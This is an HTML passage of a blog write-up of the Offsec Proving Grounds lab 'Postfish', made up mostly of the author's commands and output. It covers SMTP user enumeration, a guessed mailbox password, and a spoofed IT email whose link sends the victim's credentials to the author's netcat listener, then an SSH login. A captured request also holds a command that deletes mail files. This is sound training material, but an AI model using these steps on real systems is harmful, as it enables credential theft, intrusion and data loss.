@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Writeup - Offsec PG Postfish | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Writeup - Offsec PG Postfish | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Writeup - Offsec PG Postfish | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Writeup - Offsec PG Postfish | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Writeup - Offsec PG Postfish | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for PG Postfish">
+<meta itemprop="description" content="Writeup for PG Postfish" />
+<meta property="og:description" content="Writeup for PG Postfish" />
+<meta name="twitter:description" content="Writeup for PG Postfish" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-10-16T00:00:00Z />
+    <meta property="article:published_time" content=2023-10-16T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Writeup - Offsec PG Postfish",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-10-16",
+        "description": "Writeup for PG Postfish",
+        "wordCount":  1444 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-10-16",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/postfish/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Writeup - Offsec PG Postfish</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-10-16T00:00:00&#43;00:00" itemprop="datePublished"> 16 Oct 2023 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#postfish">PostFish</a></li>
+    <li><a href="#enumeration-with-nmap">Enumeration with Nmap</a></li>
+    <li><a href="#http-page">HTTP Page</a></li>
+    <li><a href="#enumeration-on-smtp">Enumeration on SMTP</a></li>
+    <li><a href="#sales-team-mail-inbox">Sales Team Mail Inbox</a></li>
+    <li><a href="#phishing-brian-moore">Phishing Brian Moore</a></li>
+    <li><a href="#decoded-url">Decoded URL</a></li>
+    <li><a href="#getting-shell">Getting Shell</a></li>
+    <li><a href="#shell-enumeration">Shell Enumeration</a></li>
+    <li><a href="#change-the-config-for-postfix">Change the config for postfix</a></li>
+    <li><a href="#send-email-to-trigger-the-shell">Send email to trigger the shell</a></li>
+    <li><a href="#the-other-user-shell">The other user shell</a></li>
+    <li><a href="#root-shell">Root shell</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="postfish">PostFish</h1>
+<h1 id="enumeration-with-nmap">Enumeration with Nmap</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/postfish<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -sC -sV -p- -T4 192.168.250.137 -oN nmap.txt            
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-10-16 01:38 EEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.250.137
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.047s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65528</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">25/tcp  open  smtp     Postfix smtpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-01-26T10:26:37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2031-01-24T10:26:37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+</span></span><span class="line"><span class="cl">80/tcp  open  http     Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">110/tcp open  pop3     Dovecot pop3d
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_pop3-capabilities: USER AUTH-RESP-CODE STLS RESP-CODES PIPELINING UIDL CAPA TOP SASL<span class="o">(</span>PLAIN<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-01-26T10:26:37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2031-01-24T10:26:37
+</span></span><span class="line"><span class="cl">143/tcp open  imap     Dovecot imapd <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-01-26T10:26:37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2031-01-24T10:26:37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_imap-capabilities: LOGIN-REFERRALS ID more ENABLE OK have post-login listed IDLE SASL-IR IMAP4rev1 Pre-login STARTTLS <span class="nv">AUTH</span><span class="o">=</span>PLAINA0001 capabilities LITERAL+
+</span></span><span class="line"><span class="cl">993/tcp open  ssl/imap Dovecot imapd <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_imap-capabilities: LOGIN-REFERRALS ID ENABLE OK more have LITERAL+ IDLE listed IMAP4rev1 Pre-login post-login SASL-IR capabilities <span class="nv">AUTH</span><span class="o">=</span>PLAINA0001
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-01-26T10:26:37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2031-01-24T10:26:37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">995/tcp open  ssl/pop3 Dovecot pop3d
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:ubuntu
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-01-26T10:26:37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2031-01-24T10:26:37
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_pop3-capabilities: UIDL RESP-CODES USER PIPELINING CAPA TOP AUTH-RESP-CODE SASL<span class="o">(</span>PLAIN<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span></code></pre></div><p>There are many protocols for emails, and HTTP</p>
+<h1 id="http-page">HTTP Page</h1>
+<p><img src="PostFish%2040044fed3fa9498fb14f157dadde44d1/Screenshot_2023-10-16_at_03.24.43.png" alt="Screenshot 2023-10-16 at 03.24.43.png"></p>
+<p>You have to add the IP address to /etc/hosts beforehand to see the page.</p>
+<h1 id="enumeration-on-smtp">Enumeration on SMTP</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/postfish<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc 192.168.250.137 <span class="m">25</span>                                                                                                <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl"><span class="m">220</span> postfish.off ESMTP Postfix <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">HELO x
+</span></span><span class="line"><span class="cl"><span class="m">250</span> postfish.off
+</span></span><span class="line"><span class="cl">MAIL FROM:root@postfish.off
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.0 Ok
+</span></span><span class="line"><span class="cl">RCPT TO:root
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.5 Ok
+</span></span><span class="line"><span class="cl">EHLO al
+</span></span><span class="line"><span class="cl">250-postfish.off
+</span></span><span class="line"><span class="cl">250-PIPELINING
+</span></span><span class="line"><span class="cl">250-SIZE <span class="m">10240000</span>
+</span></span><span class="line"><span class="cl">250-VRFY
+</span></span><span class="line"><span class="cl">250-ETRN
+</span></span><span class="line"><span class="cl">250-STARTTLS
+</span></span><span class="line"><span class="cl">250-ENHANCEDSTATUSCODES
+</span></span><span class="line"><span class="cl">250-8BITMIME
+</span></span><span class="line"><span class="cl">250-DSN
+</span></span><span class="line"><span class="cl">250-SMTPUTF8
+</span></span><span class="line"><span class="cl"><span class="m">250</span> CHUNKING
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/postfish<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc 192.168.250.137 <span class="m">143</span>                                                                                               <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl">* OK <span class="o">[</span>CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS <span class="nv">AUTH</span><span class="o">=</span>PLAIN<span class="o">]</span> Dovecot <span class="o">(</span>Ubuntu<span class="o">)</span> ready.
+</span></span><span class="line"><span class="cl">HELO
+</span></span><span class="line"><span class="cl">HELO BAD Error in IMAP <span class="nb">command</span> received by server.
+</span></span><span class="line"><span class="cl">HELO x
+</span></span><span class="line"><span class="cl">HELO BAD Error in IMAP <span class="nb">command</span> received by server.
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/postfish<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -vn 192.168.250.137 <span class="m">25</span>                                                                                            <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.250.137<span class="o">]</span> <span class="m">25</span> <span class="o">(</span>smtp<span class="o">)</span> open
+</span></span><span class="line"><span class="cl"><span class="m">220</span> postfish.off ESMTP Postfix <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">HELO x
+</span></span><span class="line"><span class="cl"><span class="m">250</span> postfish.off
+</span></span><span class="line"><span class="cl">VRFY root
+</span></span><span class="line"><span class="cl"><span class="m">252</span> 2.0.0 root
+</span></span><span class="line"><span class="cl">VRFY hr
+</span></span><span class="line"><span class="cl"><span class="m">252</span> 2.0.0 hr
+</span></span><span class="line"><span class="cl">VRFY blah
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;blah&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY office
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;office&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY security
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;security&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY root
+</span></span><span class="line"><span class="cl"><span class="m">252</span> 2.0.0 root
+</span></span><span class="line"><span class="cl">VRFY hr
+</span></span><span class="line"><span class="cl"><span class="m">252</span> 2.0.0 hr
+</span></span><span class="line"><span class="cl">VRFY finance
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;finance&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY business
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;business&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY engineering
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;engineering&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY dev
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;dev&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY developer
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;developer&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY management
+</span></span><span class="line"><span class="cl"><span class="m">550</span> 5.1.1 &lt;management&gt;: Recipient address rejected: User unknown in <span class="nb">local</span> recipient table
+</span></span><span class="line"><span class="cl">VRFY brian.moore
+</span></span><span class="line"><span class="cl"><span class="m">252</span> 2.0.0 brian.moore
+</span></span></code></pre></div><p>You can see that Sales, HR, and team members have emails.</p>
+<h1 id="sales-team-mail-inbox">Sales Team Mail Inbox</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/postfish<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -vn 192.168.250.137 <span class="m">110</span>                                                                                           <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.250.137<span class="o">]</span> <span class="m">110</span> <span class="o">(</span>pop3<span class="o">)</span> open
+</span></span><span class="line"><span class="cl">+OK Dovecot <span class="o">(</span>Ubuntu<span class="o">)</span> ready.
+</span></span><span class="line"><span class="cl">USER sales
+</span></span><span class="line"><span class="cl">+OK
+</span></span><span class="line"><span class="cl">PASS sales
+</span></span><span class="line"><span class="cl">+OK Logged in.
+</span></span><span class="line"><span class="cl">list
+</span></span><span class="line"><span class="cl">+OK <span class="m">1</span> messages:
+</span></span><span class="line"><span class="cl"><span class="m">1</span> <span class="m">683</span>
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">retr <span class="m">1</span>
+</span></span><span class="line"><span class="cl">+OK <span class="m">683</span> octets
+</span></span><span class="line"><span class="cl">Return-Path: &lt;it@postfish.off&gt;
+</span></span><span class="line"><span class="cl">X-Original-To: sales@postfish.off
+</span></span><span class="line"><span class="cl">Delivered-To: sales@postfish.off
+</span></span><span class="line"><span class="cl">Received: by postfish.off <span class="o">(</span>Postfix, from userid 997<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        id B277B45445<span class="p">;</span> Wed, <span class="m">31</span> Mar <span class="m">2021</span> 13:14:34 +0000 <span class="o">(</span>UTC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Received: from x <span class="o">(</span>localhost <span class="o">[</span>127.0.0.1<span class="o">])</span>
+</span></span><span class="line"><span class="cl">        by postfish.off <span class="o">(</span>Postfix<span class="o">)</span> with SMTP id <span class="m">7712145434</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> &lt;sales@postfish.off&gt;<span class="p">;</span> Wed, <span class="m">31</span> Mar <span class="m">2021</span> 13:11:23 +0000 <span class="o">(</span>UTC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Subject: ERP Registration Reminder
+</span></span><span class="line"><span class="cl">Message-Id: &lt;20210331131139.7712145434@postfish.off&gt;
+</span></span><span class="line"><span class="cl">Date: Wed, <span class="m">31</span> Mar <span class="m">2021</span> 13:11:23 +0000 <span class="o">(</span>UTC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">From: it@postfish.off
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hi Sales team,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Regards,
+</span></span><span class="line"><span class="cl">IT
+</span></span><span class="line"><span class="cl">.
+</span></span></code></pre></div><p>Sales team password is sales and it has a message from it team.
+From the looks of it, this can be used for phishing.</p>
+<h1 id="phishing-brian-moore">Phishing Brian Moore</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/postfish<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -vn 192.168.250.137 <span class="m">25</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.250.137<span class="o">]</span> <span class="m">25</span> <span class="o">(</span>smtp<span class="o">)</span> open
+</span></span><span class="line"><span class="cl"><span class="m">220</span> postfish.off ESMTP Postfix <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">HELO x
+</span></span><span class="line"><span class="cl"><span class="m">250</span> postfish.off
+</span></span><span class="line"><span class="cl">MAIL FROM: it@postfish.off
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.0 Ok
+</span></span><span class="line"><span class="cl">RCPT TO: brian.moore@postifh.off
+</span></span><span class="line"><span class="cl"><span class="m">454</span> 4.7.1 &lt;brian.moore@postifh.off&gt;: Relay access denied
+</span></span><span class="line"><span class="cl">RCPT TO: brian.moore@postfish.off
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.1.5 Ok
+</span></span><span class="line"><span class="cl">DATA
+</span></span><span class="line"><span class="cl"><span class="m">354</span> End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+</span></span><span class="line"><span class="cl">Hello brian, click the link:
+</span></span><span class="line"><span class="cl">http://192.168.45.198/
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl"><span class="m">250</span> 2.0.0 Ok: queued as 00530458F8
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvp <span class="m">80</span>                                                                                                           <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.198<span class="o">]</span> from postfish.off <span class="o">[</span>192.168.250.137<span class="o">]</span> <span class="m">44760</span>
+</span></span><span class="line"><span class="cl">POST / HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 192.168.45.198
+</span></span><span class="line"><span class="cl">User-Agent: curl/7.68.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">207</span>
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
+</span></span></code></pre></div><p>I sent email to Brian, while disguised as IT team with the malicious URL.
+And I got the response from him.</p>
+<h1 id="decoded-url">Decoded URL</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">first_name</span><span class="o">=</span>Brian<span class="p">&amp;</span><span class="nv">last_name</span><span class="o">=</span>Moore<span class="p">&amp;</span><span class="nv">email</span><span class="o">=</span>brian.moore%postfish.off<span class="p">&amp;</span><span class="nv">username</span><span class="o">=</span>brian.moore<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>EternaLSunshinE<span class="p">&amp;</span>confifind/var/mail/-typef!-namesales-delete_password<span class="o">=</span>EternaLSunshinE
+</span></span></code></pre></div><p>I got his credentials.</p>
+<h1 id="getting-shell">Getting Shell</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/postfish<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh brian.moore@postfish.off                                                                                       <span class="m">130</span> ⨯
+</span></span><span class="line"><span class="cl">brian.moore@postfish.off<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.1 LTS <span class="o">(</span>GNU/Linux 5.4.0-64-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
